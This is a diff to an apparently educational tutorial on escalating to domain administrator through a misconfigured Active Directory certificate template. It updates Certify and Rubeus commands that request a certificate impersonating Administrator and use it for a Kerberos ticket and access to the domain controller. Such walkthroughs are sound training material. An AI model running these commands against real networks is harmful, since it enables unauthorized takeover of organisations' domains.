@@ -364,7 +364,7 @@ Domain escalation via No Issuance Requirements + Enrollable Client Authenticatio
 
 To begin with, we will use [Certify](https://github.com/GhostPack/Certify) to scan the environment for vulnerabilities in the PKI infrastructure:
 
-`PS C:\Users\bob\Downloads> .\Certify.exe find /vulnerable`
+`> Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins`
 
 ![image](https://github.com/user-attachments/assets/be4e9f56-ffad-4cc0-a58d-f16f64d4ea16)
 
@@ -380,19 +380,11 @@ The certificate can be used for 'Client Authentication' (we can use it for login
 
 To abuse this template, we will use Certify and pass the argument request by specifying the full name of the CA, the name of the vulnerable template, and the name of the user, for example, Administrator:
 
-`PS C:\Users\bob\Downloads> .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator`
+`Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template CustomUser --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500`
 
-Once the attack finishes, we will obtain a certificate successfully. The command generates a PEM certificate and displays it as base64. We need to convert the PEM certificate to the [PFX](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files) format by running the command mentioned in the output of Certify (when asked for the password, press Enter without providing one), however, to be on the safe side, let's first execute the below command to avoid bad formatting of the PEM file.
+When the certificate has been issued, it is printed to the console in a base64-encoded format. The format is supported by Rubeus and can be used to authenticate as the target user with the asktgt command by setting the /certificate: parameter to the output certificate.
 
-`sed -i 's/\s\s\+/\n/g' cert.pem`
-
-Then we can execute the openssl command mentioned in the output of Certify.
-
-`openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
-
-Now that we have the certificate in a usable PFX format (which Rubeus supports), we can request a Kerberos TGT for the account Administrator and authenticate with the certificate:
-
-`PS C:\Users\bob\Downloads> .\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt`
+`> Rubeus.exe asktgt /user:Administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh... /ptt`
 
 After successful authentication, we will be able to list the content of the C$ share on DC1:
 
